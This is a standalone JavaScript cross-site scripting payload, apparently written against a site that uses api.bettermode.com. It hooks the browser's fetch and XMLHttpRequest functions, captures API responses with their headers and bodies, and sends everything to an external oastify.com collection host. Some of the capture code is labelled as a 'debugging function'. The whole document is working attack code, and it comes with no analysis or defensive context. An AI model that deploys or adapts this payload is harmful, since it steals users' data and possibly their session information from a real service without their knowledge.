<script>
// Improved exfiltration function with error handling
function exfiltrate(data) {
  console.log("[EXFIL] Attempting to send:", data);
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://z77sa60e7jna6984gdmsseycl3rujib60.oastify.com/capture', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onerror = function() {
    console.error("[EXFIL] Failed to send data");
  };
  xhr.send(JSON.stringify(data));
}

// Debugging function
function logAPIResponse(response) {
  console.group("API Interception");
  console.log("URL:", response.url);
  console.log("Status:", response.status);
  response.clone().text().then(text => {
    console.log("Raw Response:", text);
    try {
      const json = JSON.parse(text);
      console.log("Parsed JSON:", json);
      exfiltrate({
        url: response.url,
        status: response.status,
        data: json,
        headers: Object.fromEntries(response.headers.entries())
      });
    } catch (e) {
      console.error("Failed to parse JSON:", e);
      exfiltrate({
        url: response.url,
        status: response.status,
        rawResponse: text,
        error: "Response was not valid JSON"
      });
    }
  }).catch(e => {
    console.error("Failed to read response:", e);
  });
  console.groupEnd();
}

// Override fetch with better error handling
(function() {
  const originalFetch = window.fetch;
  window.fetch = function() {
    const fetchCall = originalFetch.apply(this, arguments);
    
    return fetchCall.then(response => {
      if (response.url.includes('api.bettermode.com')) {
        logAPIResponse(response);
      }
      return response;
    }).catch(error => {
      console.error("Fetch error:", error);
      exfiltrate({
        error: "Fetch failed",
        details: error.toString()
      });
      throw error;
    });
  };
})();

// Alternative XMLHttpRequest interception
(function() {
  const originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function() {
    this._url = arguments[1];
    originalOpen.apply(this, arguments);
  };
  
  const originalSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function() {
    const originalOnReadyStateChange = this.onreadystatechange;
    this.onreadystatechange = function() {
      if (this.readyState === 4 && this._url.includes('api.bettermode.com')) {
        try {
          const data = JSON.parse(this.responseText);
          exfiltrate({
            url: this._url,
            status: this.status,
            data: data,
            headers: this.getAllResponseHeaders()
          });
        } catch (e) {
          exfiltrate({
            url: this._url,
            status: this.status,
            rawResponse: this.responseText,
            error: "Failed to parse response"
          });
        }
      }
      if (originalOnReadyStateChange) {
        originalOnReadyStateChange.apply(this, arguments);
      }
    };
    originalSend.apply(this, arguments);
  };
})();

console.log("XSS payload activated - monitoring API calls to api.bettermode.com");
</script>
